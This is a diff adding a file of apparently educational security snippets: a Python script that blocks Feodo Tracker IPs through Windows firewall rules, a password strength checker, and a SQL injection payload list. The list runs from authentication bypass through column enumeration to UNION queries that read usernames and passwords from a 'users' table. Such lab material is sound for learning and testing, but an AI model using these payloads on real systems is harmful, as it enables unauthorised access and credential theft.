@@ -1,0 +1,55 @@
+//firewall
+import requests, subprocess
+data = requests.get("https://feodotracker.abuse.ch/downloads/ipblocklist.csv").text.splitlines()
+subprocess.run(["netsh","advfirewall","firewall","delete","rule","name=BadIP"])
+
+for line in data:
+    if line.startswith("#") or "dst_ip" in line: continue
+    ip = line.split(",")[1]
+    print("Block:", ip)
+    subprocess.run(["netsh","advfirewall","firewall","add","rule",
+                    "name=BadIP","dir=out","action=block","remoteip="+ip])
+//password checker
+import re
+
+p = input("Enter password: ")
+
+if len(p) < 8:
+    print("Weak: Minimum 8 characters")
+elif not any(c.isdigit() for c in p):
+    print("Weak: Need a number")
+elif not any(c.isupper() for c in p):
+    print("Weak: Need uppercase")
+elif not any(c.islower() for c in p):
+    print("Weak: Need lowercase")
+elif not re.search(r"[!@#$%^&*]", p):
+    print("Medium: Add special character")
+else:
+    print("Strong Password")
+//sql injection
+--- NORMAL TEST ---
+1
+
+--- AUTHENTICATION BYPASS ---
+1' OR '1'='1
+
+--- FIND NUMBER OF COLUMNS ---
+1' ORDER BY 1-- -
+1' ORDER BY 2-- -
+1' ORDER BY 3-- -
+1' ORDER BY 4-- -
+
+--- UNION TEST ---
+1' UNION SELECT 1,2-- -
+
+--- GET DATABASE NAME ---
+1' UNION SELECT database(),2-- -
+
+--- GET TABLE NAMES ---
+1' UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema=database()-- -
+
+--- GET COLUMN NAMES ---
+1' UNION SELECT column_name,2 FROM information_schema.columns WHERE table_name='users'-- -
+
+--- GET USERNAME + PASSWORD ---
+1' UNION SELECT user,password FROM users-- -
